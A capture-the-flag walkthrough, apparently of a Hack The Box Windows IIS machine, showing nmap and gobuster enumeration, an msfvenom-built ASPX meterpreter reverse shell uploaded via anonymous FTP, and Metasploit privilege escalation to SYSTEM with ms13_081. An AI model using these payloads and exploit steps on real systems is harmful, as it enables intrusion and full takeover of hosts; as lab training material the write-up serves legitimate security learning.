# nmap

enumerating the target using nmap,
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nmap -Pn -A  -p-20000 -sS --vv 10.129.189.54
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 08:20 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:20
Completed NSE at 08:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:20
Completed NSE at 08:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:20
Completed NSE at 08:20, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:20
Completed Parallel DNS resolution of 1 host. at 08:20, 0.05s elapsed
Initiating SYN Stealth Scan at 08:20
Scanning 10.129.189.54 [20000 ports]
Discovered open port 21/tcp on 10.129.189.54
Discovered open port 80/tcp on 10.129.189.54
SYN Stealth Scan Timing: About 15.83% done; ETC: 08:23 (0:02:45 remaining)
SYN Stealth Scan Timing: About 30.33% done; ETC: 08:23 (0:02:27 remaining)
SYN Stealth Scan Timing: About 52.43% done; ETC: 08:23 (0:01:25 remaining)
SYN Stealth Scan Timing: About 72.27% done; ETC: 08:22 (0:00:48 remaining)
Completed SYN Stealth Scan at 08:22, 160.10s elapsed (20000 total ports)
Initiating Service scan at 08:22
Scanning 2 services on 10.129.189.54
Completed Service scan at 08:22, 6.60s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.189.54
Retrying OS detection (try #2) against 10.129.189.54
Initiating Traceroute at 08:22
Completed Traceroute at 08:22, 0.40s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 08:22
Completed Parallel DNS resolution of 2 hosts. at 08:22, 0.05s elapsed
NSE: Script scanning 10.129.189.54.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:22
NSE: [ftp-bounce 10.129.189.54:21] PORT response: 501 Server cannot accept argument.
Completed NSE at 08:23, 6.49s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:23
Completed NSE at 08:23, 2.30s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
Nmap scan report for 10.129.189.54
Host is up, received user-set (0.35s latency).
Scanned at 2021-08-16 08:20:03 IST for 184s
Not shown: 19998 filtered ports
Reason: 19998 no-responses
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=8/16%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6119D313%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=7)
OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW8ST11%O5=M54BNW8ST11%O6=M54BST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M54BNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.003 days (since Mon Aug 16 08:19:20 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   393.30 ms 10.10.16.1
2   393.36 ms 10.129.189.54

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.33 seconds
           Raw packets sent: 40187 (1.772MB) | Rcvd: 9574 (1.736MB)
```
we got ftp up and running on 21 and http on port 80.

# gobuster

```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# gobuster dir -u http://10.129.189.54 -w /usr/share/dirb/wordlists/common.txt -e -n
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.189.54
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/16 08:51:33 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.189.54/aspnet_client        [Size: 158] [--> http://10.129.189.54/aspnet_client/]
                                                                                               
===============================================================
2021/08/16 08:53:23 Finished
===============================================================
```
we don't find much here.

I checked out file upload on the ftp service(as the hint mentions arbitrary file upload) and yeah we can upload files.

So I decided to a windows reverse shell file and searched the same in google how to do so.

>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4242 -f aspx > tcp_rev.aspx

# metasploit

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set lhost 10.10.16.4
lhost => 10.10.16.4                                                                                           
msf6 exploit(multi/handler) > set lport 4242
lport => 4242                                                                                                                
msf6 exploit(multi/handler) > 
```
I navigated to the tcp_rev.aspx on my browser and ran the exploit,I got a meterpreter session.

```

msf6 exploit(multi/handler) > run                                                                                                                
                                                                                                                                                 
[*] Started reverse TCP handler on 10.10.16.4:4242                                                                                               
[*] Sending stage (175174 bytes) to 10.129.189.54
[*] Meterpreter session 1 opened (10.10.16.4:4242 -> 10.129.189.54:49160) at 2021-08-16 09:37:30 +0530

meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter >
```
It's time to do Privesc.

I backgrounded the current session with the command background and searched for suggester which suggests privesc methods.

and I got quite a few results
```
msf6 exploit(multi/handler) > search suggest

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  auxiliary/server/icmp_exfil                                            normal     No     ICMP Exfiltration Service
   1  exploit/windows/browser/ms10_018_ie_behaviors         2010-03-09       good       No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   2  post/multi/recon/local_exploit_suggester                               normal     No     Multi Recon Local Exploit Suggester                                                                                                                        
   3  auxiliary/scanner/http/nagios_xi_scanner                               normal     No     Nagios XI Scanner
   4  post/osx/gather/enum_colloquy                                          normal     No     OS X Gather Colloquy Enumeration
   5  post/osx/manage/sonic_pi                                               normal     No     OS X Manage Sonic Pi
   6  exploit/windows/http/sharepoint_data_deserialization  2020-07-14       excellent  Yes    SharePoint DataSet / DataTable Deserialization
   7  exploit/windows/smb/timbuktu_plughntcommand_bof       2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow


Interact with a module by name or index. For example info 7, use 7 or use exploit/windows/smb/timbuktu_plughntcommand_bof

msf6 exploit(multi/handler) > use 2
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set showdescription true
showdescription => true
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  true             yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.189.54 - Collecting local exploits for x86/windows...
[*] 10.129.189.54 - 38 exploit checks are being tried...
[+] 10.129.189.54 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  This module will bypass Windows UAC by hijacking a special key in 
  the Registry under the current user hive, and inserting a custom 
  command that will get invoked when the Windows Event Viewer is 
  launched. It will spawn a second shell that has the UAC flag turned 
  off. This module modifies a registry key, but cleans up the key once 
  the payload has been invoked. The module does not require the 
  architecture of the payload to match the OS. If specifying 
  EXE::Custom your DLL should call ExitProcess() after starting your 
  payload in a separate process.
[+] 10.129.189.54 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.
[+] 10.129.189.54 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
  This module exploits the Task Scheduler 2.0 XML 0day exploited by 
  Stuxnet. When processing task files, the Windows Task Scheduler only 
  uses a CRC32 checksum to validate that the file has not been 
  tampered with. Also, In a default configuration, normal users can 
  read and write the task files that they have created. By modifying 
  the task file and creating a CRC32 collision, an attacker can 
  execute arbitrary commands with SYSTEM privileges. NOTE: Thanks to 
  webDEViL for the information about disable/enable.
[+] 10.129.189.54 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
  This module leverages a kernel pool overflow in Win32k which allows 
  local privilege escalation. The kernel shellcode nulls the ACL for 
  the winlogon.exe process (a SYSTEM process). This allows any 
  unprivileged process to freely migrate to winlogon.exe, achieving 
  privilege escalation. This exploit was used in pwn2own 2013 by MWR 
  to break out of chrome's sandbox. NOTE: when a meterpreter session 
  started by this exploit exits, winlogin.exe is likely to crash.
[+] 10.129.189.54 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
  This module exploits a vulnerability in win32k.sys where under 
  specific conditions TrackPopupMenuEx will pass a NULL pointer to the 
  MNEndMenuState procedure. This module has been tested successfully 
  on Windows 7 SP0 and Windows 7 SP1.
[+] 10.129.189.54 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 10.129.189.54 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
  This module abuses a process creation policy in Internet Explorer's 
  sandbox; specifically, Microsoft's RemoteApp and Desktop Connections 
  runtime proxy, TSWbPrxy.exe. This vulnerability allows the attacker 
  to escape the Protected Mode and execute code with Medium Integrity. 
  At the moment, this module only bypass Protected Mode on Windows 7 
  SP1 and prior (32 bits). This module has been tested successfully on 
  Windows 7 SP1 (32 bits) with IE 8 and IE 11.
[+] 10.129.189.54 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 10.129.189.54 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  This module exploits the vulnerability in mrxdav.sys described by 
  MS16-016. The module will spawn a process on the target system and 
  elevate its privileges to NT AUTHORITY\SYSTEM before executing the 
  specified payload within the context of the elevated process.
[+] 10.129.189.54 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
  This module exploits the lack of sanitization of standard handles in 
  Windows' Secondary Logon Service. The vulnerability is known to 
  affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
  module will only work against those versions of Windows with 
  Powershell 2.0 or later and systems with two or more CPU cores.
[+] 10.129.189.54 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
  Module utilizes the Net-NTLMv2 reflection between DCOM/RPC to 
  achieve a SYSTEM handle for elevation of privilege. Currently the 
  module does not spawn as SYSTEM, however once achieving a shell, one 
  can easily use incognito to impersonate the token.
[+] 10.129.189.54 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
  This module exploits a NULL pointer dereference vulnerability in 
  MNGetpItemFromIndex(), which is reachable via a NtUserMNDragOver() 
  system call. The NULL pointer dereference occurs because the 
  xxxMNFindWindowFromPoint() function does not effectively check the 
  validity of the tagPOPUPMENU objects it processes before passing 
  them on to MNGetpItemFromIndex(), where the NULL pointer dereference 
  will occur. This module has been tested against Windows 7 x86 SP0 
  and SP1. Offsets within the solution may need to be adjusted to work 
  with other versions of Windows, such as Windows Server 2008.
[+] 10.129.189.54 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
  to the usage of uninitialized data which allows to corrupt memory. 
  At the moment, the module has been tested successfully on Windows XP 
  SP3, Windows 2003 SP1, and Windows 7 SP1.
[*] Post module execution completed

```

### The module exploit(windows/local/ms13_081_track_popup_menu looks promising by looking at its description.I used that and managed to escalate my privileges.


```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms13_081_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms13_081_track_popup_menu) > options

Module options (exploit/windows/local/ms13_081_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 SP0/SP1


msf6 exploit(windows/local/ms13_081_track_popup_menu) > set session 1
session => 1
msf6 exploit(windows/local/ms13_081_track_popup_menu) > set lhost 10.10.16.4
lhost => 10.10.16.4
msf6 exploit(windows/local/ms13_081_track_popup_menu) > options

Module options (exploit/windows/local/ms13_081_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 SP0/SP1


msf6 exploit(windows/local/ms13_081_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Launching notepad to host the exploit...
[+] Process 2360 launched.
[*] Reflectively injecting the exploit DLL into 2360...
[*] Injecting exploit into 2360...
[*] Exploit injected. Injecting payload into 2360...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.189.54
[*] Meterpreter session 2 opened (10.10.16.4:4444 -> 10.129.189.54:49159) at 2021-08-16 09:25:26 +0530


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
